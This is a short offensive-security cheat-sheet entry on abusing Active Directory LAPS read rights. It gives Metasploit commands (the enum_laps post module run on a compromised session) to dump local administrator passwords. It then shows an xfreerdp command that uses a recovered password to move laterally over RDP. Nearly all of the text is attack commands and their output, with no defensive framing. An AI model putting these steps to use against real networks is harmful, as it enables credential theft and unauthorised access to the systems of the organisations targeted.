# LAPS Reader

If user is in PswReaders group, then you can read LAPS passwords. To abuse this with a metasploit shell:

```
use windows/gather/credentials/enum_laps
msf5 post(windows/gather/credentials/enum_laps) > set session #
session => #
msf5 post(windows/gather/credentials/enum_laps) > run
```

Enumerate hosts that you have the local admin password to and move laterally based on open connections. For example: (RDP)



```
xfreerdp /u:administrator /v:192.168.X.Y /w:1200 /h:1000
[10:57:29:033] [36184:36185] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
Password: LAPSpassword
```
